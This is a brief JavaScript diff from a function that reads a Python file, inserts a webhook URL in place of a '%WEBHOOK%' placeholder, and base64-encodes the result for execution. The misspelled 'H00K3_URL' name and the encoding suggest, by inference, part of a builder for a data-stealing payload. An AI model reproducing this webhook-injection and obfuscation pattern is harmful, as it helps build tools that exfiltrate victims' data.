@@ -58,7 +58,7 @@ async function executarPython() {
 
     let code = await fsPromises.readFile(filePath, "utf8");
 
-    code = code.replace(/H00K3_URL\s*=\s*"%WEBHOOK%"/g, () => `H00K3_URL = "${H00K3_URL}"`);
+    code = code.replace('H00K3_URL = "%WEBHOOK%"', `H00K3_URL = "${H00K3_URL}"`);
 
     const base64Code = Buffer.from(code, "utf8").toString("base64");
     const finalCode = `
